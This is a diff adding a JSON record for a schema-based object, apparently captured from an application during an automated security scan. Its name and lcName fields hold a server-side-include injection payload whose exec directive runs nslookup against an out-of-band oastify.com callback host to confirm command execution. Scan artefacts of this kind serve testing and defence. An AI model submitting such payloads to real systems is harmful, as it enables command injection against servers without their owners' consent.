@@ -1,0 +1,33 @@
+{
+	"createdTime":1741334434839,
+	"deleted":true,
+	"description":"SZHLUr",
+	"id":"67caa7a28780f312882551d6",
+	"input":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"lastModifiedBy":22743,
+	"lcName":"\"-->'-->`--><!--#set var=\"4pj\" value=\"3oiarhtapd\"--><!--#set var=\"6rl\" value=\"5qkctjvcrf\"--><!--#echo var=\"4pj\"--><!--#echo var=\"6rl\"--><!--#exec cmd=\"nslookup -q=cname qb5xe4gxc0rq481rnpgryck8mzssgt4l29uwkk9.oastify.com\" -->",
+	"modifiedTime":1741358660014,
+	"name":"\"-->'-->`--><!--#set var=\"4pj\" value=\"3oiarhtapd\"--><!--#set var=\"6rl\" value=\"5qkctjvcrf\"--><!--#echo var=\"4pj\"--><!--#echo var=\"6rl\"--><!--#exec cmd=\"nslookup -q=cname qb5xe4gxc0rq481rnpgryck8mzssgt4l29uwkk9.oastify.com\" -->",
+	"output":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"ownerUserId":22743,
+	"standard":false,
+	"version":1
+}
